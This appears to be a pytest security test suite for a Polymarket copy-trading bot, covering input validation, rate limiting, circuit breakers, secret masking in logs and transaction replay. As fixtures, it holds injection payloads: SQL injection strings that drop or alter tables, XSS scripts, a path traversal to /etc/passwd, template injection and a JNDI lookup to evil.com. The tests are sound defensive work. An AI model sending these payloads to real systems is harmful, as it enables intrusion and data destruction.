"""
Security integration tests for input validation and exploit prevention.
"""

import asyncio
from datetime import datetime, timedelta
from unittest.mock import patch

import pytest

from utils.security import mask_sensitive_data, validate_private_key


class TestInputValidationSecurity:
    """Test input validation security."""

    def test_private_key_validation_rejects_malformed_keys(self):
        """Test that malformed private keys are rejected."""
        invalid_keys = [
            "",  # Empty
            "0x",  # Too short
            "0x123",  # Too short
            "0xgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg",  # Invalid hex
            "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abc",  # No 0x prefix, wrong length
            "not_a_hex_key_at_all",  # Not hex
            "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12",  # Too long
        ]

        for invalid_key in invalid_keys:
            assert not validate_private_key(invalid_key)

    def test_private_key_validation_accepts_valid_keys(self):
        """Test that valid private keys are accepted."""
        valid_keys = [
            "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",  # Without 0x
            "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",  # All 'a's
            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",  # All 'f's
        ]

        for valid_key in valid_keys:
            assert validate_private_key(valid_key)

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com}",
            "{{7*7}}",  # SSTI attempt
            "SELECT * FROM sensitive_data",
        ],
    )
    def test_malicious_input_injection_prevention(self, malicious_input):
        """Test that malicious inputs are properly handled."""
        # Test that sensitive data masking doesn't crash on malicious input
        masked = mask_sensitive_data({"malicious": malicious_input})
        assert isinstance(masked, dict)
        assert "malicious" in masked

    def test_wallet_address_validation(self):
        """Test wallet address validation."""
        from utils.helpers import normalize_address

        valid_addresses = [
            "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "0x742D35CC6634C0532925A3B844BC454E4438F44E",  # Uppercase
            "742d35Cc6634C0532925a3b844Bc454e4438f44e",  # Without 0x
        ]

        for address in valid_addresses:
            normalized = normalize_address(address)
            assert normalized.startswith("0x")
            assert len(normalized) == 42  # 0x + 40 hex chars

        invalid_addresses = [
            "",  # Empty
            "0x",  # Too short
            "0x742d35Cc6634C0532925a3b844Bc454e",  # Too short
            "0x742d35Cc6634C0532925a3b844Bc454e4438f44e4438f44e",  # Too long
            "not_an_address",  # Not hex
            "0xgggggggggggggggggggggggggggggggggggggggg",  # Invalid hex
        ]

        for address in invalid_addresses:
            normalized = normalize_address(address)
            # Should still return a string but may not be valid
            assert isinstance(normalized, str)


class TestTradeDataValidationSecurity:
    """Test trade data validation security."""

    def test_trade_data_sql_injection_prevention(self, mock_trade_executor):
        """Test that trade data cannot contain SQL injection."""
        malicious_trade = {
            "tx_hash": "0x'; DROP TABLE trades; --",
            "timestamp": datetime.now(),
            "wallet_address": "0x'; DELETE FROM wallets; --",
            "condition_id": "0x'; UPDATE users SET admin=1; --",
            "side": "BUY'; --",
            "amount": 100.0,
            "price": 0.65,
            "token_id": "0x'; SELECT * FROM secrets; --",
            "confidence_score": 0.8,
        }

        # Validation should still work
        is_valid = mock_trade_executor._validate_trade(malicious_trade)
        # Should pass basic validation (SQL injection is handled at data layer)
        assert isinstance(is_valid, bool)

    def test_trade_data_xss_prevention(self, mock_trade_executor):
        """Test that trade data cannot contain XSS."""
        xss_trade = {
            "tx_hash": '0x<script>alert("xss")</script>',
            "timestamp": datetime.now(),
            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
            "side": "BUY",
            "amount": 100.0,
            "price": 0.65,
            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
            "confidence_score": 0.8,
        }

        is_valid = mock_trade_executor._validate_trade(xss_trade)
        assert is_valid  # XSS is handled at logging/display layer

    def test_extreme_values_rejection(self, mock_trade_executor):
        """Test that extreme values are rejected."""
        extreme_trade = {
            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "timestamp": datetime.now(),
            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
            "side": "BUY",
            "amount": 999999999999999,  # Extreme amount
            "price": 1.5,  # Invalid price (> 0.99)
            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
            "confidence_score": 0.8,
        }

        is_valid = mock_trade_executor._validate_trade(extreme_trade)
        assert not is_valid  # Should be rejected due to invalid price

    def test_negative_values_rejection(self, mock_trade_executor):
        """Test that negative values are rejected."""
        negative_trade = {
            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "timestamp": datetime.now(),
            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
            "side": "BUY",
            "amount": -100.0,  # Negative amount
            "price": 0.65,
            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
            "confidence_score": 0.8,
        }

        is_valid = mock_trade_executor._validate_trade(negative_trade)
        assert not is_valid  # Should be rejected due to negative amount


class TestRateLimitingSecurity:
    """Test rate limiting security."""

    @pytest.mark.asyncio
    async def test_api_rate_limiting_prevents_abuse(
        self, mock_wallet_monitor, mock_aiohttp_session, mock_polygonscan_response
    ):
        """Test that API rate limiting prevents abuse."""
        mock_wallet_monitor.polygonscan_api_key = "test-api-key"

        # Simulate rapid API calls
        start_time = asyncio.get_event_loop().time()

        # Make multiple rapid calls
        for i in range(5):
            await mock_wallet_monitor.get_wallet_transactions("0xtest")

        end_time = asyncio.get_event_loop().time()

        # Should have taken at least some time due to rate limiting
        # (api_call_delay = 0.2 seconds between calls)
        minimum_expected_time = 5 * mock_wallet_monitor.api_call_delay
        assert end_time - start_time >= minimum_expected_time

    @pytest.mark.asyncio
    async def test_wallet_monitoring_rate_limits(self, mock_wallet_monitor):
        """Test wallet monitoring rate limiting."""
        wallet = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"

        # Set very recent last trade
        mock_wallet_monitor.wallet_last_trade_time[wallet] = datetime.now() - timedelta(
            minutes=5
        )

        should_monitor = await mock_wallet_monitor.should_monitor_wallet(wallet)
        assert not should_monitor  # Should be rate limited

        # Set old last trade
        mock_wallet_monitor.wallet_last_trade_time[wallet] = datetime.now() - timedelta(
            hours=2
        )

        should_monitor = await mock_wallet_monitor.should_monitor_wallet(wallet)
        assert should_monitor  # Should not be rate limited


class TestCircuitBreakerSecurity:
    """Test circuit breaker security mechanisms."""

    def test_circuit_breaker_prevents_cascading_failures(self, mock_trade_executor):
        """Test that circuit breaker prevents cascading failures."""
        # Simulate high failure rate
        mock_trade_executor.total_trades = 20
        mock_trade_executor.failed_trades = 15  # 75% failure rate

        mock_trade_executor._check_circuit_breaker_conditions()

        assert mock_trade_executor.circuit_breaker_active

    def test_circuit_breaker_daily_loss_protection(self, mock_trade_executor):
        """Test circuit breaker daily loss protection."""
        mock_trade_executor.daily_loss = 200.0  # Above limit

        mock_trade_executor._check_circuit_breaker_conditions()

        assert mock_trade_executor.circuit_breaker_active
        assert "Daily loss limit reached" in mock_trade_executor.circuit_breaker_reason

    @pytest.mark.asyncio
    async def test_circuit_breaker_blocks_trading(
        self, mock_trade_executor, sample_trade
    ):
        """Test that circuit breaker blocks trading."""
        mock_trade_executor.circuit_breaker_active = True

        result = await mock_trade_executor.execute_copy_trade(sample_trade)

        assert result["status"] == "skipped"
        assert "Circuit breaker" in result["reason"]


class TestUnauthorizedAccessPrevention:
    """Test unauthorized access prevention."""

    def test_invalid_wallet_address_rejection(self, mock_trade_executor):
        """Test that invalid wallet addresses are rejected."""
        invalid_trade = {
            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "timestamp": datetime.now(),
            "wallet_address": "invalid-address",  # Invalid
            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
            "side": "BUY",
            "amount": 10.0,
            "price": 0.65,
            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
            "confidence_score": 0.8,
        }

        # This should not cause crashes, should be handled gracefully
        result = mock_trade_executor._validate_trade(invalid_trade)
        assert isinstance(result, bool)

    def test_malformed_transaction_data_handling(self, mock_wallet_monitor):
        """Test handling of malformed transaction data."""
        malformed_tx = {
            "hash": None,  # Invalid
            "from": "invalid-address",
            "to": 12345,  # Invalid type
            "value": "not-a-number",
            "gasUsed": "invalid",
            "gasPrice": {},
            "timeStamp": "invalid-timestamp",
            "input": None,
            "blockNumber": [],
        }

        # Should not crash
        trade = mock_wallet_monitor.parse_polymarket_trade(malformed_tx)
        assert trade is None  # Should return None for invalid data

    def test_extreme_input_sizes(self):
        """Test handling of extreme input sizes."""
        # Test with very large strings
        large_input = "A" * 1000000  # 1MB string

        # Should not crash the masking function
        masked = mask_sensitive_data({"large_input": large_input})
        assert isinstance(masked, dict)

        # Test with deeply nested structures
        deep_nested = {
            "level1": {"level2": {"level3": {"level4": {"level5": "value"}}}}
        }
        for i in range(100):  # Create deep nesting
            deep_nested = {"nested": deep_nested}

        masked = mask_sensitive_data(deep_nested)
        assert isinstance(masked, dict)


class TestDataLeakagePrevention:
    """Test data leakage prevention."""

    def test_private_key_masking_in_logs(self):
        """Test that private keys are masked in logged data."""
        test_data = {
            "private_key": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "api_key": "sk_live_1234567890abcdef",
            "normal_data": "this is normal",
            "amount": 100.0,
        }

        masked = mask_sensitive_data(test_data)

        # Sensitive data should be masked
        assert masked["private_key"] == "0x1234...[REDACTED]"
        assert masked["wallet_address"] == "0x742d...8f44e"
        assert masked["api_key"] == "[REDACTED]"

        # Normal data should not be masked
        assert masked["normal_data"] == "this is normal"
        assert masked["amount"] == 100.0

    def test_no_data_leakage_in_error_messages(self, mock_trade_executor):
        """Test that sensitive data doesn't leak in error messages."""
        # Create trade with sensitive data
        sensitive_trade = {
            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "timestamp": datetime.now(),
            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
            "side": "BUY",
            "amount": 1000000.0,  # Very large amount that might trigger errors
            "price": 0.65,
            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
            "confidence_score": 0.8,
        }

        # This should trigger position size rejection
        result = mock_trade_executor._apply_risk_management(sensitive_trade)

        # Error message should not contain sensitive wallet addresses
        assert "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" not in result["reason"]

    def test_secure_error_logging(self):
        """Test that errors are logged securely."""
        import logging

        from utils.security import secure_log

        logger = logging.getLogger("test")
        logger.setLevel(logging.INFO)

        with patch.object(logger, "error") as mock_log:
            error_data = {
                "private_key": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
                "error": "API connection failed",
                "wallet": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            }

            secure_log(logger, "error_event", error_data, level="error")

            # Check that the logged message masks sensitive data
            logged_call = mock_log.call_args[0][0]
            assert "0x1234...[REDACTED]" in logged_call
            assert "0x742d...8f44e" in logged_call
            assert "API connection failed" in logged_call


class TestConfigurationSecurity:
    """Test configuration security."""

    def test_environment_variable_isolation(self):
        """Test that environment variables are properly isolated."""
        # This test ensures that sensitive environment variables
        # don't leak into configuration or logs
        with patch.dict(
            "os.environ",
            {
                "PRIVATE_KEY": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
                "API_KEY": "sk_live_secret",
                "NORMAL_VAR": "normal_value",
                "PATH": "/usr/bin:/bin",  # System variable
            },
        ):
            from config.settings import Settings

            settings = Settings()

            # Sensitive environment variables should be loaded
            assert (
                settings.trading.private_key
                == "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
            )

            # But they should not appear in environment hash
            from utils.helpers import generate_environment_hash

            generate_environment_hash()

            # Environment hash should not contain sensitive data
            # (This is tested by the fact that sensitive vars are filtered out)


class TestBlockchainSecurity:
    """Test blockchain-specific security measures."""

    @pytest.mark.asyncio
    async def test_transaction_replay_prevention(self, mock_wallet_monitor):
        """Test that transactions are not processed multiple times."""
        tx_hash = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

        # Create transaction data
        tx = {
            "hash": tx_hash,
            "from": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "to": mock_wallet_monitor.polymarket_contracts[0],
            "value": "0",
            "gasUsed": "150000",
            "gasPrice": "50000000000",
            "timeStamp": str(int((datetime.now() - timedelta(minutes=5)).timestamp())),
            "input": "0x1234567890abcdef",
            "blockNumber": "50000000",
        }

        # First processing
        trades1 = mock_wallet_monitor.detect_polymarket_trades([tx])
        assert len(trades1) == 1
        assert tx_hash in mock_wallet_monitor.processed_transactions

        # Second processing of same transaction
        trades2 = mock_wallet_monitor.detect_polymarket_trades([tx])
        assert len(trades2) == 0  # Should be skipped

    @pytest.mark.asyncio
    async def test_recent_transaction_filtering(self, mock_wallet_monitor):
        """Test that very recent transactions are filtered to prevent reorg issues."""
        # Create very recent transaction
        tx = {
            "hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "from": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "to": mock_wallet_monitor.polymarket_contracts[0],
            "value": "0",
            "gasUsed": "150000",
            "gasPrice": "50000000000",
            "timeStamp": str(int(datetime.now().timestamp())),  # Current time
            "input": "0x1234567890abcdef",
            "blockNumber": "50000000",
        }

        trades = mock_wallet_monitor.detect_polymarket_trades([tx])

        # Should be filtered out due to being too recent
        assert len(trades) == 0


class TestMemorySafety:
    """Test memory safety and resource exhaustion prevention."""

    def test_memory_safe_transaction_processing(self, mock_wallet_monitor):
        """Test that transaction processing doesn't cause memory issues."""
        # Create many transactions
        transactions = []
        for i in range(1000):
            tx = {
                "hash": f"0x{i:064x}",
                "from": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                "to": mock_wallet_monitor.polymarket_contracts[0],
                "value": "0",
                "gasUsed": "150000",
                "gasPrice": "50000000000",
                "timeStamp": str(
                    int((datetime.now() - timedelta(hours=i)).timestamp())
                ),
                "input": f"0x1234567890abcdef{i:016x}",
                "blockNumber": str(50000000 + i),
            }
            transactions.append(tx)

        # Process all transactions
        trades = mock_wallet_monitor.detect_polymarket_trades(transactions)

        # Should process without memory issues
        assert isinstance(trades, list)
        assert len(mock_wallet_monitor.processed_transactions) > 0

    def test_trade_history_memory_limits(self, mock_wallet_monitor):
        """Test that trade history is limited to prevent memory bloat."""
        wallet = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"

        # Add many trades to history
        for i in range(200):  # More than the 100 limit
            trade = {
                "tx_hash": f"0x{i:064x}",
                "timestamp": datetime.now(),
                "amount": 10.0,
            }
            mock_wallet_monitor.wallet_trade_history[wallet].append(trade)

        # Simulate the cleanup that happens in monitor_wallets
        mock_wallet_monitor.wallet_trade_history[wallet] = (
            mock_wallet_monitor.wallet_trade_history[wallet][-100:]
        )

        # Should be limited to 100 trades
        assert len(mock_wallet_monitor.wallet_trade_history[wallet]) <= 100
